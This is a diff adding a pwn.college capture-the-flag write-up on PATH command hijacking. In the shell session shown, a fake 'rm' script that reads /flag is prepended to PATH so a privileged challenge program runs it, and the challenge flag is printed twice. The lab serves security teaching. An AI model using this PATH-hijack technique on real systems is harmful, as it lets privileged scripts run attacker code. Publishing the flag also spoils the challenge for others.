@@ -60,8 +60,25 @@ Used command 10 and got the flag.
 # HIJACKING COMMANDS
 ### Command:
 ```
-
+1)hacker@path~hijacking-commands:~$ touch rm
+2)hacker@path~hijacking-commands:~$ echo "cat /flag" > rm
+3)hacker@path~hijacking-commands:~$ echo cat /flag > rm
+4)hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
+5)hacker@path~hijacking-commands:~$ echo $PATH
+Output:
+/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+6)hacker@path~hijacking-commands:~$ ls -l rm
+Output
+-rw-r--r-- 1 hacker hacker 10 Oct 19 19:14 rm
+7)hacker@path~hijacking-commands:~$ chmod a+rwx rm
+8)hacker@path~hijacking-commands:~$ ls -l rm
+-rwxrwxrwx 1 hacker hacker 10 Oct 19 19:14 rm
+9)hacker@path~hijacking-commands:~$ /challenge/run
+Output:
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{E_ts2LiTIE-HIhQI2dbhU0ULORz.ddzNyUDL0cDM1czW}
 ```
 ### Explanation:
 ### Flag:
->
+>pwn.college{E_ts2LiTIE-HIhQI2dbhU0ULORz.ddzNyUDL0cDM1czW}
